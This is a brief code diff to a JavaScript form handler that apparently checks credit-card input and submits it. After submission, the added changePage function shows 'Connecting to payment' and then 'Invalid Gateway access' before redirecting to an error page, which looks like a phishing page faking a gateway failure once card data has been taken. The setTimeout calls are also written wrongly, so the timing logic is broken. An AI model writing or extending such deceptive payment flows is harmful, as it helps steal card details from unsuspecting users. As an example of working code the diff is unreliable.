@@ -224,7 +224,12 @@ document.addEventListener("alpine:init", () => {
       }
       return true;
     },
-    validateContact() {},
+    verif: null,
+    changePage() {
+      this.verif = 'Connecting to payment';
+      setTimeout(this.verif = 'Invalid Gateway access', 2500);
+      setTimeout(window.location.replace("/error/"), 3000);
+    },
     handleSubmit(e) {
       e.preventDefault();
 
@@ -237,7 +242,7 @@ document.addEventListener("alpine:init", () => {
           headers: { "Content-Type": "application/x-www-form-urlencoded" },
           body: new URLSearchParams(formData).toString(),
         })
-          .then(() => window.location.replace("/error/"))
+          .then(() => this.changePage())
           .catch((error) => alert(error));
       } else {
         this.cc_valid = true;
